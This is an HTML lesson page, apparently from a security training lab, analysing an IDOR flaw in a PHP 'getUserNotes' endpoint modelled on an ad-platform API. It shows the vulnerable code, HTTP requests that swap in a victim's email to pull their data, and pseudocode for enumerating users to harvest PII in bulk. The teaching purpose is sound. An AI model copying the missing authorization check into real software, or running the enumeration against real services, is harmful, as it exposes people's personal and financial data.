<h1 class="doc-title">Vulnerability Analysis</h1>
<p class="doc-subtitle">Deep dive into the technical details of the IDOR flaw</p>

<div class="section">
    <h2>Vulnerable Code Analysis</h2>
    <p>
        The <code>getUserNotes</code> API endpoint contains a critical authorization flaw. Let's 
        examine the vulnerable implementation:
    </p>
    
    <div class="code-block">
<span class="comment">// VULNERABLE CODE - api/getUserNotes.php</span>

<span class="keyword">if</span> (!isset($_SESSION['user_id'])) {
    <span class="comment">// ‚úì Authentication check - ensures user is logged in</span>
    http_response_code(401);
    echo json_encode(['error' => 'Unauthorized']);
    exit;
}

<span class="comment">// Parse request body</span>
$data = json_decode(file_get_contents('php://input'), true);
$userEmail = $data['params']['updates'][0]['value']['userEmail'];

<span class="comment">// ‚ùå VULNERABILITY: No authorization check!</span>
<span class="comment">// Server uses the provided email directly without verifying ownership</span>

$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
$stmt->execute([$userEmail]);
$userData = $stmt->fetch();

<span class="comment">// Returns ANY user's data based on email parameter</span>
echo json_encode(['user' => $userData, 'notes' => $notes]);
    </div>

    <div class="warning-box">
        <h4>‚ö†Ô∏è The Missing Check</h4>
        <p>
            The code should verify that <code>$userEmail === $_SESSION['email']</code> before 
            returning any data. Without this check, any authenticated user can query any email.
        </p>
    </div>
</div>

<div class="section">
    <h2>Attack Flow</h2>
    <p>Understanding the attack sequence:</p>
    
    <div class="code-block">
<span class="comment">// Step 1: Attacker logs in legitimately</span>
POST /login.php
email=attacker@example.com&password=attacker123

<span class="comment">// Step 2: Attacker receives valid session cookie</span>
Set-Cookie: PHPSESSID=abc123xyz

<span class="comment">// Step 3: Attacker calls API with THEIR email (normal behavior)</span>
POST /api/getUserNotes.php
Cookie: PHPSESSID=abc123xyz
{ "params": { "updates": [{ "value": { "userEmail": "<span class="string">attacker@example.com</span>" }}]}}

<span class="comment">// Response: Attacker's own data ‚úì</span>

<span class="comment">// Step 4: Attacker modifies email to victim's email (EXPLOIT)</span>
POST /api/getUserNotes.php  
Cookie: PHPSESSID=abc123xyz
{ "params": { "updates": [{ "value": { "userEmail": "<span class="string">victim1@mtnbusiness.com</span>" }}]}}

<span class="comment">// Response: VICTIM's data! ‚ùå Server returned unauthorized data</span>
    </div>
</div>

<div class="section">
    <h2>Data Exposed</h2>
    <p>
        The API response includes comprehensive user data across multiple categories:
    </p>
    
    <table>
        <tr>
            <th>Data Category</th>
            <th>Fields Exposed</th>
            <th>Risk Level</th>
        </tr>
        <tr>
            <td>User Profile</td>
            <td>Full name, email, phone, address, company</td>
            <td>üî¥ High</td>
        </tr>
        <tr>
            <td>Financial Data</td>
            <td>Tax ID, bank account number, billing address</td>
            <td>üî¥ Critical</td>
        </tr>
        <tr>
            <td>Private Notes</td>
            <td>Internal memos, strategic plans, passwords</td>
            <td>üî¥ Critical</td>
        </tr>
        <tr>
            <td>API Credentials</td>
            <td>API keys, webhook URLs, integration secrets</td>
            <td>üî¥ Critical</td>
        </tr>
        <tr>
            <td>Ad Campaigns</td>
            <td>Campaign budgets, targeting data, performance</td>
            <td>üü° Medium</td>
        </tr>
        <tr>
            <td>Account Settings</td>
            <td>Preferences, notification settings, timezone</td>
            <td>üü¢ Low</td>
        </tr>
    </table>
</div>

<div class="section">
    <h2>Why Authentication Isn't Enough</h2>
    <p>
        A common misconception is that requiring login protects resources. This lab demonstrates 
        the difference between authentication and authorization:
    </p>
    
    <table>
        <tr>
            <th>Concept</th>
            <th>Question Answered</th>
            <th>In This Lab</th>
        </tr>
        <tr>
            <td><strong>Authentication</strong></td>
            <td>"Who are you?"</td>
            <td>‚úì User must log in to access API</td>
        </tr>
        <tr>
            <td><strong>Authorization</strong></td>
            <td>"What can you access?"</td>
            <td>‚ùå No check if user owns the requested data</td>
        </tr>
    </table>
    
    <div class="note-box">
        <h4>üí° Key Insight</h4>
        <p>
            Authentication confirms identity. Authorization controls access. Both are required 
            for proper security. An authenticated user should only access resources they own 
            or have explicit permission to view.
        </p>
    </div>
</div>

<div class="section">
    <h2>Request Structure Analysis</h2>
    <p>
        The MTN MobAd API uses a complex nested JSON structure that may seem secure due to its 
        complexity, but the underlying flaw remains:
    </p>
    
    <div class="code-block">
{
  "params": {
    "updates": [
      {
        "param": "user",
        "value": {
          "userEmail": "target@example.com"  <span class="comment">// ‚Üê IDOR Parameter</span>
        },
        "op": "a"
      }
    ]
  }
}
    </div>
    
    <p>
        The nested structure and opaque field names (like "op": "a") are examples of 
        "security through obscurity" - they may slow down attackers but don't prevent exploitation 
        once the structure is understood.
    </p>
</div>

<div class="section">
    <h2>Enumeration Potential</h2>
    <p>
        Because the API accepts any valid email, attackers can systematically enumerate users:
    </p>
    
    <div class="code-block">
<span class="comment">// Automated enumeration script (pseudocode)</span>

emails = [
    "admin@mtnmobad.com",
    "ceo@bigcorp.ng",
    "finance@acme.com.ng",
    <span class="comment">// ... thousands more from data breaches or guessing</span>
]

<span class="keyword">for</span> email <span class="keyword">in</span> emails:
    response = POST("/api/getUserNotes.php", {
        userEmail: email
    })
    
    <span class="keyword">if</span> response.status == 200:
        save_pii(email, response.data)
        print(f"[+] Leaked PII for: {email}")
    </div>
    
    <div class="warning-box">
        <h4>‚ö†Ô∏è Mass Data Breach Risk</h4>
        <p>
            Combined with a list of known emails (from previous breaches, LinkedIn scraping, or 
            common patterns), this vulnerability enables mass extraction of user PII.
        </p>
    </div>
</div>
